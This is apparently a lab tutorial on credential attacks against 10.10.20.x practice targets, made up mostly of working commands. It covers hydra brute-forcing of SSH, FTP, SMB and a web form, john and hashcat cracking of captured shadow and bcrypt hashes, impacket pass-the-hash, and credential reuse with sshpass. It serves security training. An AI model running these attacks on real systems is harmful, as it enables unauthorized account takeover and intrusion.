# Password and Credential Attacks - Typing

This lesson types the credential workflow: build wordlists, run online attacks
with hydra, identify and crack hashes, and use a captured hash as a credential
against the lab targets.

## Install the tools

The credential tooling is packaged for Arch.

```bash
# install the attack and cracking tools
sudo pacman -S hydra john hashcat

# install wordlists and impacket-style tools
sudo pacman -S wordlists impacket
```

The wordlists package provides the standard wordlist collections.

## Extract the classic wordlist

rockyou ships compressed in the wordlists package.

```bash
# locate the compressed wordlist
find /usr/share/wordlists -iname 'rockyou*'

# decompress it for direct use
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# count the candidates
wc -l /usr/share/wordlists/rockyou.txt
```

The decompressed list is the general-purpose fallback.

## Build a targeted wordlist

A small custom list often beats a huge generic one.

```bash
# create a targeted wordlist from the target's identity
cat > exploit/wordlist.txt <<'EOF'
lab
lablab
lab2026
lab!2026
admin
administrator
password
letmein
welcome1
Summer2026
EOF

# show the list
cat exploit/wordlist.txt
```

Target-derived words match human password choices.

## Collect candidate usernames

Usernames come from the earlier phases.

```bash
# build a username list from recon and web evidence
cat > exploit/users.txt <<'EOF'
admin
root
lab-user
dev
ftpuser
EOF

# show the list
cat exploit/users.txt
```

A username list is the input the online attack iterates over.

## Attack SSH with hydra

Hydra tries each password against the SSH service.

```bash
# online attack against SSH with one username
hydra -l admin -P exploit/wordlist.txt ssh://10.10.20.5

# attack a set of usernames against SSH
hydra -L exploit/users.txt -P exploit/wordlist.txt \
    ssh://10.10.20.5
```

A successful attempt prints the confirmed password.

## Control the attack rate

Online attacks must respect the service and the scope.

```bash
# limit parallel connections and add a delay
hydra -l admin -P exploit/wordlist.txt \
    -t 4 -W 2 ssh://10.10.20.5
```

Lower parallelism and a delay reduce lockout risk.

## Attack a web login form

Hydra reads the login form's request format.

```bash
# capture the form structure with curl
curl -s http://10.10.20.5/login -o exploit/web/login.html
grep -oiE '<form[^>]*>' exploit/web/login.html

# attack the form using its POST format
hydra -l admin -P exploit/wordlist.txt \
    http-post-form \
    "/login:username=^USER^&password=^PASS^:F=Invalid login"
```

The failure string tells hydra which response means a failed attempt.

## Attack FTP

FTP accepts the same online-attack pattern.

```bash
# online attack against the FTP service
hydra -l ftpuser -P exploit/wordlist.txt ftp://10.10.20.5
```

Anonymous and weak FTP credentials are a common lab finding.

## Identify a captured hash

Cracking starts by identifying the hash format.

```bash
# show the captured hash
cat exploit/post/shadow.txt

# identify the format with john's identifier
john --list=formats | grep -iE 'sha512|bcrypt'
hashid -m exploit/post/shadow.txt
```

The identifier output names the algorithm and the mode number.

## Crack a hash with john

John the Ripper tries candidates and matches hashes.

```bash
# crack the captured hash with a wordlist
john --wordlist=exploit/wordlist.txt exploit/post/shadow.txt

# show the recovered passwords
john --show exploit/post/shadow.txt
```

John displays the recovered plaintext for each matched hash.

## Crack a hash with hashcat

Hashcat uses the GPU and needs an explicit mode.

```bash
# identify the hash type, then crack with the mode number
hashcat -m 1800 -a 0 exploit/post/shadow.txt \
    exploit/wordlist.txt

# add rules to multiply the candidate list
hashcat -m 1800 -a 0 exploit/post/shadow.txt \
    exploit/wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# show the recovered password
hashcat -m 1800 --show exploit/post/shadow.txt
```

The mode number must match the identified algorithm.

## Generate rules for the wordlist

Rules transform base words into realistic password patterns.

```bash
# create a small ruleset
cat > exploit/rules.txt <<'EOF'
:            # keep the base word
$1           # append 1
$2026        # append the year
c            # capitalize the first letter
c $!
so0          # substitute letters
EOF

# apply the ruleset with john
john --wordlist=exploit/wordlist.txt \
    --rules=exploit/rules.txt exploit/post/shadow.txt
```

A rule that matches the target's conventions cracks faster than brute force.

## Pass-the-hash

A captured NT hash authenticates without the plaintext password.

```bash
# use the NT hash as the credential against SMB
impacket-wmiexec 'domain/user@10.10.20.5' \
    -hashes aad3b435b51404eeaad3b435b51404ee:<NTHASH>

# list the available impacket tools
command -v impacket-wmiexec impacket-psexec
```

The hash value replaces the password in the authentication exchange.

## Verify a recovered credential

A confirmed password is proven by logging in.

```bash
# install sshpass for non-interactive SSH login
sudo pacman -S sshpass

# verify the recovered credential over SSH
sshpass -p 'Summer2026' ssh -o StrictHostKeyChecking=no \
    admin@10.10.20.5 'id && hostname'
```

The command output confirms the credential is real.

## Test credential reuse

Credentials found on one service often work on another.

```bash
# reuse the web credential against SSH
hydra -l admin -P exploit/wordlist.txt ssh://10.10.20.5

# reuse the web credential against the SMB service
hydra -l admin -P exploit/wordlist.txt smb://10.10.20.6

# reuse the recovered password against a second host
sshpass -p 'Summer2026' ssh admin@10.10.20.6 'id'
```

Reused credentials expand the access beyond the original finding.

## Crack a web application hash

Web frameworks store bcrypt hashes that need the bcrypt mode.

```bash
# capture the web application's password hash
grep -rE '\$2[aby]\$' exploit/web/ | head

# crack the bcrypt hash with john
john --wordlist=exploit/wordlist.txt exploit/post/web-hash.txt

# crack the same hash with hashcat's bcrypt mode
hashcat -m 3200 -a 0 exploit/post/web-hash.txt \
    exploit/wordlist.txt
```

bcrypt mode is slow by design; a targeted list is the right input.

## Save the credentials evidence

Credentials recovered during the engagement are sensitive evidence.

```bash
# record the confirmed credentials
cat > exploit/creds.txt <<'EOF'
# recovered credentials
10.10.20.5 ssh admin:Summer2026
10.10.20.5 ftp ftpuser:letmein
EOF

# restrict the file's permissions
chmod 600 exploit/creds.txt

# show the evidence list
cat exploit/creds.txt
```

Confirmed credentials feed the next phase and the final report.

## Wrap up

Credential sequence: wordlists -> usernames -> online attacks -> hash
identification -> offline cracking -> pass-the-hash -> evidence.
